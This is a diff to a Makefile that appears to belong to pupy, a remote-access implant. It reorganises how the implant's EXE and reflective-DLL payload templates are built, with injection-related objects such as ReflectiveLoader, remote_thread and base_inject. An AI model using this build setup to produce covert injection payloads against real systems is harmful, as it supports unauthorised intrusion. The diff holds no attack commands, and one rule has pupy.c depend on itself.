@@ -37,20 +37,22 @@ endif
 
 SECARGS     := "cl" ".xzdata"
 
-CFLAGS      := $(CFLAGS) /I..\\lzma
+CFLAGS      := $(CFLAGS) /I..\\lzma /I..\\jvm
 
 PYOBJS := \
 	_memimporter.obj \
 	MyLoadLibrary.obj \
 	Python-dynload.obj \
 	pupy_load.obj \
-	pupy.obj \
 	base_inject.obj
 
 COMMON_OBJS := \
 	MemoryModule.obj \
 	actctx.obj list.obj thread.obj remote_thread.obj \
 	LoadLibraryR.obj
+
+SHARED_OBJS := ReflectiveLoader.obj pupy_shared.obj main_reflective.obj 
+APP_OBJS := main_exe.obj pupy.obj
 
 ifeq ($(UNCOMPRESSED),)
 COMMON_OBJS += LzmaDec.obj
@@ -67,7 +69,7 @@ revision.h:
 	if [ -z $$COMMIT ]; then rev=$$(cat ../../.git/`cat ../../.git/HEAD | cut -f 2 -d \ ` | cut -c 1-8); \
 	 else rev=$$COMMIT; fi; echo "#define GIT_REVISION_HEAD \"$$rev\"" >$@
 
-pupy.c: resources/$(ARCH)/library.c revision.h
+pupy.c: pupy.c resources/$(ARCH)/library.c revision.h
 pupy_load.c: resources/$(ARCH)/msvcr90.c resources/$(ARCH)/python27.c resources/bootloader.c revision.h
 
 import-tab.c import-tab.h: mktab.py
@@ -121,11 +123,14 @@ main_exe.obj: main_exe.c
 ReflectiveLoader.obj: ReflectiveLoader.c
 	$(CC) /c $(CFLAGS) /DREFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN /DREFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR /O2 /Ob1 $<
 
-$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)exe: main_exe.obj $(PYOBJS) $(COMMON_OBJS)
+pupy_shared.obj: pupy.c resources/$(ARCH)/library.c revision.h
+	$(CC) /c $(CFLAGS) /D_PUPY_DLL $<
+
+$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)exe: $(PYOBJS) $(APP_OBJS) $(COMMON_OBJS)
 	$(CC) $(CFLAGS) $+ /Fe$@ $(LINKER_OPTS)
 	unzip -p resources/$(ARCH)/library.zip fid.toc >$@.toc
 
-$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)dll: main_reflective.obj $(PYOBJS) ReflectiveLoader.obj $(COMMON_OBJS)
+$(TEMPLATE_OUTPUT_PATH)/pupy$(PPARCH).$(SUFFIX)dll: $(PYOBJS) $(SHARED_OBJS) $(COMMON_OBJS)
 	$(CC) $(CFLAGS) $+ /Fe$@ /LD
 	unzip -p resources/$(ARCH)/library.zip fid.toc >$@.toc
 
